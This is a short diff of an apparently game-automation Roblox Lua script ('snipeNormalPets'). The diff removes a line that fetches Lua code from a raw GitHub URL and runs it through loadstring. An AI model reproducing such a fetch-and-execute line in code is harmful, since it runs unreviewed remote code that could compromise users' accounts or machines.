@@ -11,7 +11,6 @@ local http = game:GetService("HttpService")
 local ts = game:GetService("TeleportService")
 local rs = game:GetService("ReplicatedStorage")
 local playerID
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xccsdf/abc/main/test.lua"))()
 
 if not snipeNormalPets then
     snipeNormalPets = false
